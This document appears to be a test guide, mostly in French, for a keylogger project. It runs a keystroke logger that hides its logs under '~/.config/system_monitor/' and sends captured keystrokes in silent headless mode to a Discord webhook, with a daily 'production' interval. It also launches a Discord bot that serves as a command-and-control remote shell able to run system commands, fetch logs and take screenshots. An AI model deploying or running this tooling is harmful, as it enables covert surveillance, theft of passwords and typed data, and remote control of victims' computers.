# Test Guide - Keylogger Project

## Installation

```bash
pip install -r requirements.txt
```

## Test 1: Keystroke Logger Only

```bash
python main.py
```

- Lance le monitoring en console
- Capture vos touches clavier
- Affiche en temps réel
- Données sauvegardées dans `~/.config/system_monitor/`
- **Ctrl+C** pour arrêter

## Test 2: With Discord Webhook Exfiltration

### Étape 1: Créer un webhook Discord

```bash
python discord_setup.py
```

Suivez les instructions pour obtenir une URL webhook.

### Étape 2: Lancer le monitoring avec exfiltration

```bash
python main.py --webhook <YOUR_WEBHOOK_URL> --interval 10 --headless
```

- Envoie les données à Discord toutes les 10 secondes (test)
- Mode silencieux (pas d'affichage console)
- **Ctrl+C** pour arrêter

### Pour production (une fois par jour):

```bash
python main.py --webhook <YOUR_WEBHOOK_URL> --interval 86400 --headless
```

## Test 3: Discord Bot C2 (Remote Shell)

### Étape 1: Créer le bot Discord

Voir [DISCORD_BOT_SETUP.md](DISCORD_BOT_SETUP.md)

### Étape 2: Lancer le bot

```bash
python shell_client.py YOUR_BOT_TOKEN
```

Vous verrez:
```
[+] Bot connected as BotName#1234
[+] Starting Discord bot...
[*] Waiting for commands...
```

### Étape 3: Tester les commandes depuis Discord

Dans votre channel Discord, tapez:

```
pwd              → Affiche le répertoire courant
ls               → Liste les fichiers
whoami           → Utilisateur système
!info            → État du monitoring
!logs            → Affiche les logs captures
!screenshot      → Capture écran maintenant
!help            → Affiche l'aide
```

Les résultats apparaissent dans Discord.

## Test 4: Combiné (Monitoring + Webhook + Bot)

### Terminal 1: Lancer le monitoring

```bash
python main.py --webhook <YOUR_WEBHOOK_URL> --interval 600 --headless
```

Données envoyées à Discord toutes les 10 minutes.

### Terminal 2: Lancer le bot

```bash
python shell_client.py YOUR_BOT_TOKEN
```

Vous avez les deux:
- Rapports automatiques via webhook
- Contrôle interactif via bot

## Vérifier les données collectées

Fichiers stockés dans: `~/.config/system_monitor/`

```bash
ls ~/.config/system_monitor/logs/
cat ~/.config/system_monitor/logs/keystroke_*.json
```

## Dépannage

**Permission denied?**
- Sur macOS: Donner permission à Terminal d'accéder au clavier
  - Paramètres système → Sécurité → Accessibilité → Ajouter Terminal
